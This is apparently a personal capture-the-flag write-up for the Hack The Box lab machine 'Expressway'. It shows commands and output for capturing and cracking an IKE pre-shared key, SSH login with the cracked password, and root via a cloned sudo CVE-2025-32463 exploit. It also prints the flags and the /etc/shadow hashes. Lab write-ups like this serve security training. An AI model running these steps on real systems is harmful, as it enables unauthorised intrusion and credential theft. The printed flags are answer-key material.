---
file_created: 21 Sep 2025 16:56
title: Expressway
difficulty: Easy
difficult_sort: 1
points: 20
os: Linux
target_ip: 10.10.11.87
platform: Hack The Box
category: B2R
box_status: Active
url: https://app.hackthebox.com/machines/736
user_flag: true
root_flag: true
completed: false
date_finish: 2025-09-21
tags:
  - htb/machines
---
# Resolution summary

>[!summary]
>- Step 1
>- Step 2
## Tutorial

```cardlink
url: https://insidepwn.com/hackthebox-expressway-walkthrough
title: "HackTheBox | Expressway"
description: "HackTheBox Expressway machine writeup"
host: insidepwn.com
favicon: https://cdn.hashnode.com/res/hashnode/image/upload/v1753692328631/9498b5d7-429e-4457-a779-74e7daeb9044.png?auto=compress,format&format=webp&fm=png
image: https://hashnode.com/utility/r?url=https%3A%2F%2Fcdn.hashnode.com%2Fres%2Fhashnode%2Fimage%2Fupload%2Fv1758400253317%2Ff63afb86-6245-4c90-ac5d-b61a00a99408.png%3Fw%3D1200%26h%3D630%26fit%3Dcrop%26crop%3Dentropy%26auto%3Dcompress%2Cformat%26format%3Dwebp%26fm%3Dpng
```
## Improved skills
- Skill 1
- Skill 2

## Tools Used
- rustscan; nmap; gobuster

---
# Environment Setup
```bash
export IP=10.10.11.87
```
---
# Information Gathering

## Scanned all TCP ports:

```bash
rustscan -a $IP -r 1-65535 -t 10000 --ulimit 5000

PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack
```

## Enumerated open TCP ports:

```bash
nmap -sC -sV -Pn $IP -p 22

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 10.0p2 Debian 8 (protocol 2.0)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Scanned Top 200 UDP ports: 
```bash
sudo nmap -sU --top-ports 200 10.10.11.87

PORT     STATE         SERVICE
68/udp   open|filtered dhcpc
69/udp   open|filtered tftp
500/udp  open          isakmp
4500/udp open|filtered nat-t-ike
```
## Enumerated UDP ports: 
```bash
PORT    STATE SERVICE VERSION
500/udp open  isakmp?
| ike-version:
|   attributes:
|     XAUTH
|_    Dead Peer Detection v1.0
```
## Results
### Port 22 - SSH:
- tcp; OpenSSH 10.0p2 Debian 8 
### Port 500 - ISAKMP:
- udp ; ISAKMP uses [UDP Port 500](https://www.google.com/search?cs=1&sca_esv=c8c5cbf533aa5f5e&q=UDP+Port+500&sa=X&ved=2ahUKEwjr8uWmreqPAxXcU0EAHeKyKjsQxccNegQIAhAB&mstk=AUtExfCuPYQx9VBmOmPRxBMqyC_5hATaHiIgtTYn5KkjLeCfPcMXDzyIrvHOIbLdg3Dq2eIIKhpxJ23gUhtM8jDDi7v-DdHjLVskukiqqcY4Xg1Z9KNC-4eqzeteYKZapu1x5EJCkk3bXHAwCiZLEo8H88zX6HGcTWr2Z15p_o0dqF3WA5A&csui=3) to ==establish secure VPN connections by negotiating IPsec encryption keys between devices==, which is the Internet Key Exchange (IKE) protocol for the first phase of a VPN tunnel. This standard port handles the initial setup and key management for IPsec tunnel

---
# Enumeration

## Port 500 - ISAKMP
```bash
sudo ike-scan -A -P $IP
```
```txt
Starting ike-scan 1.9.5 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
10.10.11.87     Aggressive Mode Handshake returned HDR=(CKY-R=8f167fd4d3878c60) SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800) KeyExchange(128 bytes) Nonce(32 bytes) ID(Type=ID_USER_FQDN, Value=ike@expressway.htb) VID=09002689dfd6b712 (XAUTH) VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0) Hash(20 bytes)

IKE PSK parameters (g_xr:g_xi:cky_r:cky_i:sai_b:idir_b:ni_b:nr_b:hash_r):
----------Copy in file named psk.txt-------------------
9e170e6256b5cf9282abadae952c1b3be93ee429029bf187c959900cb130c71d154ff050bea4a79f3bdb73fa4c671e536d1bc99c7e85207a6a97cfaab41f9f7cbb3d5ffac0d2540d160f0e420d4138b60e73bcc3229434f42343dd588704c25b8d967b9f03f75fce9a3c29a9b5a997fe437280229ac49149b10155fec9e5ab75:51f31264a5b657401e7eb367cb9f6b3767196661f8f9ff754de6a4a5cc1fe5fdc516ac6c163d12ec0641f128b3deed89a819da20a66dfa77573c402c9cde9e0c47813a37e14fe4ec2a8bc0de11fcb65f811dbb13efc14b4194d76beb99197593d35097e381dab982da8064c2ec1d4c45e671252828034936686ac1eeb6409ffe:8f167fd4d3878c60:7ff8ce92d36edafa:00000001000000010000009801010004030000240101000080010005800200028003000180040002800b0001000c000400007080030000240201000080010005800200018003000180040002800b0001000c000400007080030000240301000080010001800200028003000180040002800b0001000c000400007080000000240401000080010001800200018003000180040002800b0001000c000400007080:03000000696b6540657870726573737761792e687462:aea0752083d48673dd24dddf0650db270ac8265b:a40664b1a121db4e097133be79f6cbba97febebf595a283ff7d3ebe17f4a768b:5d9000940599888771d831b22761d46fddceb6a4
-------------------------------------------------------
Ending ike-scan 1.9.5: 1 hosts scanned in 0.500 seconds (2.00 hosts/sec).  1 returned handshake; 0 returned notify
```
- add `expressway.htb` to `/etc/hosts`
```bash
echo "10.10.11.87 expressway.htb" | sudo tee -a /etc/hosts
```
- crack code  for `Value=ike@expressway.htb`
```bash
 sudo psk-crack psk.txt -d /usr/share/wordlists/rockyou.txt
```
- Output
```txt 
Starting psk-crack [ike-scan 1.9.5] (http://www.nta-monitor.com/tools/ike-scan/)
Running in dictionary cracking mode
key "freakingrockstarontheroad" matches SHA1 hash 5d9000940599888771d831b22761d46fddceb6a4
Ending psk-crack: 8045040 iterations in 10.732 seconds (749651.55 iterations/sec)
```
- creaking give `freakingrockstarontheroad`
- password for `ike@expressway.htb` 
```sh
sshpass -p "freakingrockstarontheroad" ssh ike@expressway.htb -p 22
```
---
# Exploitation
## SSH -Port 22
```sh
sshpass -p "freakingrockstarontheroad" ssh ike@expressway.htb -p 22
```
- located the user flag
- tar the home directory and open python http server 
```bash
tar -cvpJf ike_home_$(date +%F).tar.xz .
python3 -m http.server 8080
```
---
# Lateral Movement -None
---
# Privilege Escalation to root

## Local enumeration
```bash
ike@expressway:~$ sudo -V
Sudo version 1.9.17
ike@expressway:~$ id
uid=1001(ike) gid=1001(ike) groups=1001(ike),13(proxy)
```
- sudo version 1.9.17
![](<./attachments/Expressway.png>)
## Privilege Escalation vector
- **[CVE-2025-32463_chwoot](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot)**
```bash 
git clone https://github.com/pr0v3rbs/CVE-2025-32463_chwoot.git
cd CVE-2025-32463_chwoot
./sudo-chwoot.sh
```
- root access 
```bash
root@expressway:/# id
uid=0(root) gid=0(root) groups=0(root),13(proxy),1001(ike)
```
---
# Trophies

## User Flag
```txt
4715d072d5a898838bd4b11e64d013e4
```
## Root Flag
```txt
a2186a79b4e5669d6e4f9fcba737159f
```
## **/etc/shadow**
- have root access `root@expressway`
```sh
grep -F '$' /etc/shadow
```
- output
```txt
root:$y$j9T$u0cgimzO/m87OQdCkETl10$mTZSmVXBn10OJT7qVqvlEr7OwC0QppltyX33WH1esn7:20229:0:99999:7:::
ike:$y$j9T$iACv1qBHXsR1j0yqIsVwY.$udBwggnZtUPt/0TNMIhsU4TDrQm2tCzTr6xUE0ilPQ4:20292:0:99999:7:::
```

---
# Proof
![](<./attachments/Expressway-1.png>)